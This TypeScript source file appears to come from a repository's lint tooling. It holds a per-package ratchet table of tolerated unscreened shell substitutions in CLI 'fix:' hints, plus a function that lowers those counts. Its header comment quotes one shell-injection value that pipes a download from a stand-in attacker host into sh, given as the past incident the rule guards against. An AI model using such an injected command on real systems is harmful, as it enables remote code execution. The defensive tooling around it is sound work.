// The ratchet under `scripts/fix-shell-arg.ts`: how many `${…}` substitutions in each package sit
// in a SHELL COMMAND POSITION inside a `fix:` value, unscreened. The number may FALL and may never
// rise. Data only — the rule owns what it does with these.
//
// WHY A COUNT AND A SENTENCE. Every site pinned here is a claim that the value cannot carry shell
// syntax — usually because it is a literal this process wrote, or a name a schema already parsed.
// That claim holds exactly until the value arrives from a URL, a header, a database row or a file
// on disk, which is where the one that shipped came from: `x g route /$(curl -s http://evil.sh|sh)`
// was the rendered `fix:` for an unauthenticated GET against any unrouted path. The sentence is
// where a human says which side of that line a package's fix lines sit on.
//
// Shrink it with `bun run scripts/fix-shell-arg.ts --unpin <pkg>[,<pkg>]`, which lowers a count to
// what is measured and refuses to raise one. Raising a count is a hand edit, in a review.

/** Where the table lives, so a stale-pin finding can name the file to edit. */
export const FIX_SHELL_PINS_FILE = 'scripts/lib/fix-shell-arg-pins.ts';

export interface FixShellArgPin {
  /** How many sites this package is allowed to hold today. */
  readonly count: number;
  /** Why those values cannot carry shell syntax. Named sources, never "false positives". */
  readonly reason: string;
}

/**
 * Measured 2026-09-06, on the first run of the rule — the counts the command itself re-derives in
 * `data.counts`, so no number here is a claim `bun run fix-shell-arg --json` cannot check.
 *
 * `@ultimat3/core` is deliberately NOT absent: it holds `renderFixShellArg` and still splices
 * un-screened values of its own, which is the same shape as `@ultimat3/auth` holding
 * `timingSafeEqual` and — measured — being the one package with no `===` on a secret.
 */
export const FIX_SHELL_ARG_PINS: Readonly<Record<string, FixShellArgPin>> = {
  action: {
    count: 4,
    reason:
      '`errors.ts` and `client.ts` splice an ACTION NAME into `x actions describe <name>` / `x mcp tools`. The name comes from the action registry, which is a key an `action()` declaration wrote in this process — never from a request. The day a route name reaches one of these, it is caller data.',
  },
  admin: {
    count: 1,
    reason:
      '`errors.ts:81` splices `input.entity` into `x admin resources`. The entity name is a registry key an `entity()` declaration wrote, and the admin registry refuses one that no entity declared.',
  },
  ai: {
    count: 1,
    reason:
      '`eval-errors.ts:39` splices `input.eval` into `x ai eval <name>`. The eval name is the key its own `defineEval()` registered under, in this process.',
  },
  auth: {
    count: 5,
    reason:
      "`oauth-discovery.ts:89,99,123` and `jwks.ts:172,181` splice a `curl` TARGET — the discovery URL and the JWKS URI. SUSPECT, and the most exposed row in this table: both are read out of a provider's own discovery document, so the value is remote text this process did not write. `new URL()` has already parsed them, which bounds them to a URL grammar and is why they are pinned rather than red; a URL may still carry a `;` in its path. `renderFixShellArg` is the repair and `@ultimat3/auth` should be the first row deleted.",
  },
  cli: {
    count: 74,
    reason:
      "the CLI's own commands, and the widest row by an order of magnitude: 63 of the 76 splice a value into `x <something>` — a command name, a generator kind, a test type, a workspace directory, a route path, a CI job name — each of which `@ultimat3/cli` itself parsed against a closed list before rendering the fix. The remainder are `bun run <script>`, `gh`, `docker` and `git` with a workspace or branch name. What makes the row big rather than dangerous is that a CLI's inputs are argv, already in the operator's own shell; what keeps it a debt is `island-shot.ts`, `mcp-host.ts` and `ci-runs.ts`, whose values come off a browser, an MCP client and the GitHub API.",
  },
  core: {
    count: 2,
    reason:
      '`registrar.ts:108,130` splice a PRIMITIVE KIND into `bun add @ultimat3/<kind>`. `PRIMITIVE_KINDS` is the closed list of eight in that same file, and a kind that is not one of them never reaches the refusal. The package that OWNS `renderFixShellArg` still holding two of these is the same shape as `@ultimat3/auth` owning `timingSafeEqual`.',
  },
  db: {
    count: 7,
    reason:
      "`drift-findings.ts`, `drift-errors.ts` and `migration-errors.ts` splice a COLUMN NAME, a MIGRATION ID, a migration FILE PATH and a branch name into `x db gen`, `git checkout --` and `rm`. SUSPECT: a column name comes off the live Postgres catalog and a migration path off disk, so neither is a literal this process wrote — `shellInertIdentifier` is `@ultimat3/db`'s own screen and these are the sites it was written for.",
  },
  entity: {
    count: 4,
    reason:
      '`errors.ts`, `count-by.ts` and `aggregate.ts` splice an ENTITY NAME or a COLUMN NAME into `x db gen` / `x entities describe`. Both are registry keys an `entity()` declaration wrote in this process, and the registry is what the refusal consulted to find them missing.',
  },
  http: {
    count: 2,
    reason:
      "`error-facts.ts:81` splices an `X_*` CODE into `x errors explain <code>` and `errors.ts:247` a POLICY ID into `x policy explain`. A code is `X_SCREAMING_SNAKE` by the registry's own validator and a policy id is a `can()` declaration's first argument.",
  },
  i18n: {
    count: 3,
    reason:
      '`errors.ts:45,59,108` splice a LOCALE TAG into `x i18n sync <locale>`. `:45` already screens through `normalizeForFix(tag)`, which is a package-local screen this rule does not recognise by name; the other two carry a tag the config declared.',
  },
  jobs: {
    count: 6,
    reason:
      '`errors.ts` and `backfill-errors.ts` splice a JOB NAME, a BACKFILL NAME or a JOB ID into `x jobs show` / `x jobs retry`. A name is the key its own `job()` registered under; a job id is a uuid the driver minted, and `input.jobId` is the value in this table closest to being caller data.',
  },
  mail: {
    count: 7,
    reason:
      "`driver-smtp.ts:196,218` splice an SMTP HOST and PORT into `openssl s_client -starttls smtp -connect <host>:<port>`, and `driver-resend.ts:181` a base URL into `curl`. All three come from `configureMail()` — an app's own configuration, in its own source — never from a message or a recipient.",
  },
  mcp: {
    count: 1,
    reason:
      "`server.ts:337` splices an `X_*` CODE into `x errors explain <code>`. Same shape as `@ultimat3/http`'s: the code is `X_SCREAMING_SNAKE` by the registry's own validator.",
  },
  policy: {
    count: 1,
    reason:
      '`errors.ts:106` splices a POLICY LABEL into `x policy explain <label>`. The label is the id a `can()` declaration passed as its first argument, in this process.',
  },
  query: {
    count: 2,
    reason:
      '`errors.ts:85,304` splice a QUERY NAME into `x queries describe <name>`. The name is the key its own `query()` registered under.',
  },
  render: {
    count: 1,
    reason:
      '`surfaces.ts:224` splices an ENTRY PATH into `x routes`. The path is a route file this build already resolved on disk, under `apps/*/`.',
  },
  scripts: {
    count: 31,
    reason:
      "this repo's own gate rules, which run on a developer's machine and CI and ship to nobody: 20 splice a workspace name, a package directory or a leaf key into `bun run scripts/<rule>.ts --unpin <x>`, six a path into `git checkout --`, and the rest a package name into `gh` / `npm view`. Every value is a workspace directory, a file this tree contains or a key derived from its own source. The one that is not — `scaffold-first-run.ts:106`, a `cd <dir> && <the app bin>` — points at a temp directory this script created.",
  },
};

/**
 * What this package is allowed to have today. Absent means zero, deliberately — and so does a row
 * whose REASON is blank: "pinned" with no sentence is the waiver axiom 3 refuses.
 */
export const fixShellArgPinnedFor = (
  pkg: string,
  pins: Readonly<Record<string, FixShellArgPin>> = FIX_SHELL_ARG_PINS,
): number => (fixShellArgPinIsBlank(pkg, pins) ? 0 : (pins[pkg]?.count ?? 0));

/** A row that exists and says nothing: the count is not honoured, and the gap says which row. */
export const fixShellArgPinIsBlank = (
  pkg: string,
  pins: Readonly<Record<string, FixShellArgPin>> = FIX_SHELL_ARG_PINS,
): boolean => Object.hasOwn(pins, pkg) && (pins[pkg]?.reason ?? '').trim() === '';

/**
 * The edit `X_FIX_SHELL_ARG_PIN_STALE` names, performed: lower each named package's count to what
 * is measured, and refuse to raise one. Returns the entries it changed, so the caller can say
 * "nothing to lower" rather than reporting a write it did not make.
 */
export async function applyFixShellArgUnpin(
  root: string,
  packages: readonly string[],
  counts: Readonly<Record<string, number>>,
  // The table to compare against is the one in the file being EDITED: `root` may be a temp
  // directory, and comparing a fixture's rows against this module's would refuse an edit the
  // fixture needs.
  pins: Readonly<Record<string, FixShellArgPin>> = FIX_SHELL_ARG_PINS,
): Promise<readonly string[]> {
  const path = `${root}/${FIX_SHELL_PINS_FILE}`;
  let text = await Bun.file(path).text();
  const written: string[] = [];
  for (const pkg of packages) {
    const found = counts[pkg] ?? 0;
    if (found >= fixShellArgPinnedFor(pkg, pins)) continue;
    // `RegExp.escape`, never the raw key: a workspace name holding regex syntax matches a
    // NEIGHBOURING row, so the ratchet lowers a count on the wrong package and enforces it there.
    const key = RegExp.escape(pkg);
    if (found === 0) {
      // The whole entry, reason and all — a row claiming a debt of zero reads as a rule still in
      // force over nothing. Both spellings Biome writes, one line and wrapped.
      const entry = new RegExp(`^\\s*(['"]?)${key}\\1:\\s*\\{[\\s\\S]*?\\},\\n`, 'm');
      if (!entry.test(text)) continue;
      text = text.replace(entry, '');
    } else {
      const entry = new RegExp(`^(\\s*(['"]?)${key}\\2:\\s*\\{\\s*\\n?\\s*count:\\s*)\\d+,`, 'm');
      if (!entry.test(text)) continue;
      text = text.replace(entry, `$1${String(found)},`);
    }
    written.push(`${pkg} -> ${String(found)}`);
  }
  if (written.length > 0) await Bun.write(path, text);
  return written;
}
